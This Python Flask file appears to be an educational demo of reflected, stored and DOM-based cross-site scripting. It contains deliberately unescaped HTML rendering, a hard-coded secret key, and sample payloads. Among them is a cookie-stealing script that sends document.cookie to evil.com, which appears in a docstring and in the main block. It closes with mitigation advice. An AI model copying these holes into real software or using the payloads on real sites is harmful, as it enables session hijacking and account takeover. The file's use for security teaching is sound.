"""
Cross-Site Scripting (XSS) Vulnerability Demo
============================================

VULNERABILITY TYPE: Cross-Site Scripting (XSS)
SEVERITY: High
DESCRIPTION: This file demonstrates XSS vulnerabilities where user input is rendered
directly in HTML without proper sanitization or encoding.

ATTACK VECTORS:
- Reflected XSS: Malicious script in URL parameters displayed on page
- Stored XSS: Malicious script stored in database and displayed to other users
- DOM-based XSS: Client-side script modification of DOM

IMPACT:
- Session hijacking through cookie theft
- Account takeover
- Malware distribution
- Phishing attacks
- Defacement of web pages
"""

from flask import Flask, request, render_template_string, make_response, session
import html

app = Flask(__name__)
app.secret_key = 'insecure_secret_key'  # Another vulnerability!

# In-memory storage for demonstration
comments = []
user_profiles = {}

class VulnerableWebApp:
    
    def vulnerable_search_page(self, search_query):
        """
        ðŸš¨ VULNERABILITY: Reflected XSS in Search Results
        
        ISSUE: User input directly embedded in HTML without encoding
        ATTACK: URL like "/search?q=<script>alert('XSS')</script>"
        """
        
        # VULNERABLE CODE: Direct HTML injection
        html_template = f"""
        <html>
        <head><title>Search Results</title></head>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: {search_query}</p>
            <div id="results">
                <!-- Search results would go here -->
                No results found for your query.
            </div>
        </body>
        </html>
        """
        
        return html_template
    
    def vulnerable_comment_display(self, username, comment_text):
        """
        ðŸš¨ VULNERABILITY: Stored XSS in Comments
        
        ISSUE: User comments stored and displayed without sanitization
        ATTACK: Comment like "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
        """
        
        # Store comment (vulnerable to stored XSS)
        comments.append({
            'username': username,
            'comment': comment_text,  # VULNERABLE: No sanitization
            'timestamp': '2024-01-01 12:00:00'
        })
        
        # VULNERABLE CODE: Direct rendering of user content
        comments_html = ""
        for comment in comments:
            comments_html += f"""
            <div class="comment">
                <strong>{comment['username']}</strong> says:<br>
                {comment['comment']}<br>
                <small>Posted on: {comment['timestamp']}</small>
            </div>
            <hr>
            """
        
        return f"""
        <html>
        <head><title>Comments</title></head>
        <body>
            <h1>User Comments</h1>
            {comments_html}
        </body>
        </html>
        """
    
    def vulnerable_profile_page(self, username, bio):
        """
        ðŸš¨ VULNERABILITY: Stored XSS in User Profiles
        
        ISSUE: User profile data displayed without HTML encoding
        ATTACK: Bio like "<img src=x onerror=alert('Profile XSS')>"
        """
        
        # Store user profile
        user_profiles[username] = {
            'bio': bio,  # VULNERABLE: No HTML encoding
            'join_date': '2024-01-01'
        }
        
        profile = user_profiles.get(username, {})
        
        # VULNERABLE CODE: Direct HTML rendering
        return f"""
        <html>
        <head><title>{username}'s Profile</title></head>
        <body>
            <h1>Profile: {username}</h1>
            <div class="profile-bio">
                <h3>About me:</h3>
                <p>{profile.get('bio', 'No bio available')}</p>
            </div>
            <p>Member since: {profile.get('join_date', 'Unknown')}</p>
        </body>
        </html>
        """
    
    def vulnerable_error_page(self, error_message):
        """
        ðŸš¨ VULNERABILITY: XSS in Error Messages
        
        ISSUE: Error messages include user input without sanitization
        ATTACK: Invalid input that gets reflected in error messages
        """
        
        # VULNERABLE CODE: Error message includes unsanitized user input
        return f"""
        <html>
        <head><title>Error</title></head>
        <body>
            <h1>An Error Occurred</h1>
            <div class="error" style="color: red;">
                Error processing your request: {error_message}
            </div>
            <a href="/">Go back to home</a>
        </body>
        </html>
        """
    
    def vulnerable_dom_manipulation(self, user_input):
        """
        ðŸš¨ VULNERABILITY: DOM-based XSS
        
        ISSUE: Client-side JavaScript uses user input to modify DOM
        ATTACK: Fragment like "#<script>alert('DOM XSS')</script>"
        """
        
        return f"""
        <html>
        <head><title>DOM XSS Demo</title></head>
        <body>
            <h1>Welcome!</h1>
            <div id="user-content"></div>
            
            <script>
                // VULNERABLE CODE: Direct DOM manipulation with user input
                var userInput = "{user_input}";
                document.getElementById('user-content').innerHTML = userInput;
                
                // Also vulnerable through URL fragment
                var fragment = location.hash.substring(1);
                if (fragment) {{
                    document.getElementById('user-content').innerHTML = fragment;
                }}
            </script>
        </body>
        </html>
        """

# Flask routes demonstrating XSS vulnerabilities
webapp = VulnerableWebApp()

@app.route('/search')
def search():
    """Vulnerable search endpoint"""
    query = request.args.get('q', '')
    return webapp.vulnerable_search_page(query)

@app.route('/comments', methods=['GET', 'POST'])
def comments_page():
    """Vulnerable comments endpoint"""
    if request.method == 'POST':
        username = request.form.get('username', 'Anonymous')
        comment = request.form.get('comment', '')
        return webapp.vulnerable_comment_display(username, comment)
    
    # Display existing comments
    return webapp.vulnerable_comment_display('', '')

@app.route('/profile/<username>')
def profile(username):
    """Vulnerable profile endpoint"""
    bio = request.args.get('bio', 'No bio provided')
    return webapp.vulnerable_profile_page(username, bio)

# Example usage demonstrating the vulnerabilities
if __name__ == "__main__":
    print("=== XSS VULNERABILITY DEMONSTRATIONS ===\n")
    
    webapp = VulnerableWebApp()
    
    # 1. Reflected XSS
    print("1. Reflected XSS Attack:")
    malicious_search = "<script>alert('Reflected XSS!')</script>"
    result = webapp.vulnerable_search_page(malicious_search)
    print(f"Generated HTML contains: {malicious_search}\n")
    
    # 2. Stored XSS
    print("2. Stored XSS Attack:")
    malicious_comment = "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
    webapp.vulnerable_comment_display("hacker", malicious_comment)
    print("Malicious comment stored and will execute for all users!\n")
    
    # 3. Profile XSS
    print("3. Profile XSS Attack:")
    malicious_bio = "<img src=x onerror=alert('Profile compromised')>"
    result = webapp.vulnerable_profile_page("victim", malicious_bio)
    print("Profile contains malicious code\n")
    
    # 4. Error page XSS
    print("4. Error Message XSS:")
    malicious_error = "<script>alert('Error XSS')</script>"
    result = webapp.vulnerable_error_page(malicious_error)
    print("Error message contains executable code\n")
    
    print("=== SECURITY RECOMMENDATIONS ===")
    print("âœ… HTML encode all user input before displaying: html.escape(user_input)")
    print("âœ… Use templating engines with automatic escaping (Jinja2 with autoescape)")
    print("âœ… Implement Content Security Policy (CSP) headers")
    print("âœ… Validate and sanitize input on both client and server side")
    print("âœ… Use HTTPOnly and Secure flags for cookies")
    print("âœ… Avoid innerHTML and use textContent for DOM manipulation")
    
    # Don't run Flask in production like this!
    # app.run(debug=True)  # debug=True is also a security vulnerability! 